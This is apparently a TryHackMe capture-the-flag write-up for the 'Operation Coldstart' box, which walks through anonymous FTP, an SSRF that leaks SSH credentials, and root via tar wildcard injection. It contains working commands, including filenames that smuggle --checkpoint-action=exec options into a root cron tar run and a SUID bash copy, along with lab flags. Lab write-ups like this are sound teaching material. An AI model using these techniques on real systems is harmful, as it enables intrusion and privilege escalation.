# TryHackMe — Operation Coldstart
**Difficulty:** Easy (underrated — techniques are intermediate)
**Date:** June 30, 2026
**Author:** Ross Fisher

---

## Overview

Operation Coldstart chains together four distinct techniques: anonymous FTP to get source code, Server-Side Request Forgery (SSRF) to leak internal credentials, SSH access, and a tar wildcard injection via a misconfigured cron job to get root. The box is rated Easy but teaches concepts well above that difficulty level. The SSRF exploitation requires reading and understanding Python source code, and the privesc requires knowing an obscure tar attack that doesn't show up on most beginner checklists.

**Flags:**
- User: `THM{96dc7bd50d2fb98fcece01560788b5ab}`
- Root: `THM{e6ee84a483d67ade06936fcfd1433e8a}`

**Credentials found:**
- webdev:V0ltLabs#summer (leaked via SSRF from admin_notes.txt)

---

## Recon

### Nmap

```bash
sudo nmap -sV -sC -p- --min-rate 5000 -Pn 10.145.128.130
```

Key ports:
- **21** — vsftpd 3.0.5 (anonymous FTP allowed)
- **22** — OpenSSH 9.6p1
- **80** — Gunicorn (Python web server, titled "URL Preview - Volt Labs")

The nmap script immediately flagged anonymous FTP login as allowed — always the first thing to check when you see FTP.

---

## FTP — Source Code Disclosure

```bash
ftp 10.145.128.130
# Name: anonymous
# Password: (blank)
ftp> cd pub
ftp> get backup.tar.gz
```

Extracted the archive:

```bash
gunzip backup.tar.gz
tar -xf backup.tar
cd voltlabs-preview
```

Contents:
- `app.py` — the full Python Flask web application source code
- `README.md` — "Admin routes are gated by source-IP check (localhost only)"
- `requirements.txt` — flask, requests, gunicorn

**Key lesson:** Source code in FTP is an immediate jackpot. Read every file before touching the web app.

---

## Understanding the Vulnerability — SSRF

Reading app.py revealed two critical things:

**1. The /preview endpoint fetches URLs on your behalf:**
```python
@app.route("/preview")
def preview():
    target = request.args.get("url", "")
    host = (urlparse(target).hostname or "").lower()
    if host not in ALLOWED_HOSTS:
        abort(403)
    r = requests.get(target, timeout=3)
```

The server makes HTTP requests to whatever URL you give it — but only if the hostname is in `ALLOWED_HOSTS`.

**2. ALLOWED_HOSTS only contains one entry:**
```python
ALLOWED_HOSTS = {"kestrel.thm"}
```

The comment in the code said: "Internal hostname resolves to 127.0.0.1 via /etc/hosts on this box."

**3. The /admin/notes route is localhost-only:**
```python
@app.route("/admin/<path:p>")
def admin(p="index"):
    if not request.remote_addr.startswith("127."):
        abort(403)
    if p == "notes":
        with open("/opt/voltlabs-preview/admin_notes.txt") as f:
            return "<pre>" + f.read() + "</pre>"
```

This is a Server-Side Request Forgery (SSRF) vulnerability. The attack works like this:

- You submit `http://kestrel.thm/admin/notes` to the /preview endpoint
- The server fetches that URL on your behalf
- The request originates from the server itself (127.0.0.1)
- The admin route sees a localhost request and allows it
- The admin notes file contents are returned to you

The hostname check passes because `kestrel.thm` is in the allowed list. The localhost check passes because the server is making the request, not you.

### Setting up /etc/hosts

The web app runs at kestrel.thm, so add it to your hosts file:

```bash
echo "TARGET_IP kestrel.thm" | sudo tee -a /etc/hosts
```

### Exploiting SSRF

In browser or curl:

```
http://kestrel.thm/preview?url=http://kestrel.thm/admin/notes
```

Response:
```
=== INTERNAL ===
SSH access for staging:
  user: webdev
  pass: V0ltLabs#summer
- Mara
```

---

## Foothold — SSH as webdev

```bash
ssh webdev@10.145.128.130
# password: V0ltLabs#summer
```

User flag in home directory:
```bash
cat user.txt
# THM{96dc7bd50d2fb98fcece01560788b5ab}
```

---

## Privilege Escalation — Tar Wildcard Injection via Cron

### Enumeration

```bash
sudo -l
# Sorry, user webdev may not run sudo on coldstart.

find / -perm -u=s -type f 2>/dev/null
# Nothing useful — all standard system binaries

id
# uid=1001(webdev) gid=1001(webdev) groups=1001(webdev)

cat /etc/cron.d/voltlabs-backup
```

This was the key finding:

```
# Volt Labs staging backup - runs as root
SHELL=/bin/bash
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
* * * * * root cd /opt/backups && tar czf /var/backups/uploads.tgz *
```

Root runs tar with a wildcard (`*`) in a directory webdev owns:

```bash
ls -la /opt/backups/
# drwxrwx--- 2 webdev webdev 4096 — webdev has full write access
```

### The Attack — Tar Wildcard Injection

When tar expands the `*` wildcard, it picks up all filenames in the directory. If you create files whose names look like tar command-line flags, tar treats them as arguments. This lets you inject arbitrary options into a root-executed tar command.

The `--checkpoint-action` flag tells tar to execute a command at each checkpoint.

**Step 1: Create a malicious script**
```bash
echo 'cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash' > /opt/backups/shell.sh
chmod +x /opt/backups/shell.sh
```

**Step 2: Create the magic filename files**
```bash
echo "" > /opt/backups/--checkpoint=1
echo "" > "/opt/backups/--checkpoint-action=exec=sh shell.sh"
```

**Step 3: Wait up to 60 seconds for cron to run**

When tar expands `*`, it sees these filenames and interprets them as flags:
- `--checkpoint=1` — trigger a checkpoint after every file
- `--checkpoint-action=exec=sh shell.sh` — execute shell.sh at each checkpoint

Root's tar command runs shell.sh, which copies bash to /tmp with the SUID bit set.

**Step 4: Check and use**
```bash
ls -la /tmp/rootbash
# -rwsr-sr-x 1 root root 1446024 — SUID set, owned by root

/tmp/rootbash -p
whoami
# root
```

**Step 5: Get root flag**
```bash
find / -name flag.txt 2>/dev/null
cat /root/flag.txt
# THM{e6ee84a483d67ade06936fcfd1433e8a}
```

---

## Attack Chain Summary

```
Anonymous FTP → backup.tar.gz → Python source code
→ Read source code → SSRF vulnerability in /preview endpoint
→ Add kestrel.thm to /etc/hosts
→ SSRF: http://kestrel.thm/preview?url=http://kestrel.thm/admin/notes
→ Leaked credentials: webdev:V0ltLabs#summer
→ SSH as webdev → user flag
→ /etc/cron.d/voltlabs-backup → root tar wildcard in /opt/backups (webdev-writable)
→ Tar wildcard injection → SUID bash copy at /tmp/rootbash
→ /tmp/rootbash -p → root → root flag
```

---

## Key Lessons

**1. Always read source code from FTP before touching the web app.** The entire attack path was documented in app.py — the vulnerability was even commented with `# VULN`.

**2. SSRF works by making the server fetch URLs on your behalf.** When the server makes the request, it originates from localhost — bypassing IP-based access controls. The attack URL needs to pass the hostname allow-list check AND point to an internal resource.

**3. Cron jobs running as root with wildcards in writable directories are critical findings.** The `* * * * *` schedule means you only wait 60 seconds maximum for your payload to execute.

**4. Tar wildcard injection requires three things:** a writable directory, root running tar with `*` in that directory, and the ability to create files with names that look like tar flags.

**5. The `-p` flag on a SUID bash binary preserves privileges.** Without `-p`, bash drops the SUID bit as a security measure. Always use `/tmp/rootbash -p`, not just `/tmp/rootbash`.

---

## Tools Used

- nmap (-sV -sC)
- ftp (anonymous login)
- gunzip / tar
- curl / browser (SSRF exploitation)
- ssh
- cron enumeration
- tar wildcard injection (manual)
